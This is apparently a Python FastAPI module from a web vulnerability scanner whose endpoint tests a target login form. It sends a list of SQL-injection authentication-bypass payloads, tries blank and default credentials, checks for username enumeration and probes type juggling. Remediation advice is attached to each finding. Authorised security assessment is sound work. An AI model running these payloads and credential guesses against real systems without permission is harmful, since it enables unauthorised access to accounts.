import asyncio
import httpx
from fastapi import APIRouter
from models import AuthFlawsReq
from tools.utils import clean_url, f, ok, err, HEADERS

router = APIRouter(tags=["exploitation"])

FAIL_TOKENS = ["invalid", "incorrect", "failed", "error", "wrong", "denied", "unauthorized", "bad credentials"]
SQLI_PAYLOADS = ["' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "admin'--", "' OR ''='"]
DEFAULT_CREDS = [("admin","admin"), ("admin","password"), ("admin","123456"),
                 ("admin","admin123"), ("root","root"), ("administrator","administrator")]


def is_success(resp, final_url: str) -> bool:
    body_l = resp.text.lower()
    if resp.status_code == 302 and "login" not in final_url.lower():
        return True
    return not any(t in body_l for t in FAIL_TOKENS) and resp.status_code == 200


@router.post("/auth_flaws")
async def auth_flaws(req: AuthFlawsReq):
    url = clean_url(req.target)
    uf = req.username_field
    pf = req.password_field
    findings = []
    records = []

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10) as c:
        # Blank password
        r = await c.post(url, data={uf: req.username, pf: ""}, headers=HEADERS)
        if is_success(r, str(r.url)):
            findings.append(f("critical", "Blank Password Accepted",
                               f"Login succeeded with {req.username} + empty password",
                               "Enforce non-empty password"))
            records.append({"Test": "Blank Password", "Payload": "(empty)", "Result": "SUCCESS", "HTTP": r.status_code})
        else:
            records.append({"Test": "Blank Password", "Payload": "(empty)", "Result": "Failed", "HTTP": r.status_code})

        # SQLi bypass
        for payload in SQLI_PAYLOADS:
            r = await c.post(url, data={uf: payload, pf: payload}, headers=HEADERS)
            if is_success(r, str(r.url)):
                findings.append(f("critical", "SQL Injection Auth Bypass",
                                   f"Payload: {payload}",
                                   "Use prepared statements — never concatenate input into SQL"))
                records.append({"Test": "SQLi Bypass", "Payload": payload, "Result": "SUCCESS", "HTTP": r.status_code})
                break

        # Username enumeration
        r_valid   = await c.post(url, data={uf: req.username, pf: "WRONG_" + req.username + "_XYZ"}, headers=HEADERS)
        r_invalid = await c.post(url, data={uf: "nonexistent_xyzabc_" + req.username, pf: "WRONG_XYZ"}, headers=HEADERS)
        diff = abs(len(r_valid.text) - len(r_invalid.text))
        if diff > 30:
            findings.append(f("medium", "Username Enumeration Possible",
                               f"Response diff between valid/invalid user: {diff}B",
                               "Return identical responses for valid/invalid usernames"))
            records.append({"Test": "Username Enum", "Payload": "valid vs invalid user",
                            "Result": f"Diff: {diff}B", "HTTP": r_valid.status_code})
        else:
            findings.append(f("pass", "Username Enumeration Not Obvious", f"Response diff: {diff}B"))
            records.append({"Test": "Username Enum", "Payload": "valid vs invalid",
                            "Result": "No significant diff", "HTTP": r_valid.status_code})

        # Default credentials
        for u, p in DEFAULT_CREDS:
            r = await c.post(url, data={uf: u, pf: p}, headers=HEADERS)
            if is_success(r, str(r.url)):
                findings.append(f("critical", f"Default Credentials Work: {u}:{p}",
                                   "Authentication succeeded with defaults",
                                   "Change defaults; enforce strong password policy"))
                records.append({"Test": "Default Creds", "Payload": f"{u}:{p}",
                                "Result": "SUCCESS", "HTTP": r.status_code})
                break

        # Type juggling — JSON POST
        try:
            r = await c.post(url, json={uf: req.username, pf: 0},
                              headers={**HEADERS, "Content-Type": "application/json"})
            body_l = r.text.lower()
            if r.status_code not in [400, 422] and not any(t in body_l for t in FAIL_TOKENS):
                findings.append(f("high", "Possible Type Juggling: password=0",
                                   f"JSON POST with numeric password returned {r.status_code} without error",
                                   "Use strict type checking; validate input type server-side"))
                records.append({"Test": "Type Juggling", "Payload": "JSON password=0",
                                "Result": f"HTTP {r.status_code}", "HTTP": r.status_code})
        except Exception:
            pass

        findings.append(f("info", "Manual Test: Response Manipulation",
                           "Intercept with Burp — change 'false'→'true' or 403→200 in response",
                           "Validate auth server-side, not client-side"))

    return ok({"summary": {"URL": url, "Tests Run": len(records)},
               "findings": findings, "records": records,
               "record_columns": ["Test", "Payload", "Result", "HTTP"]})
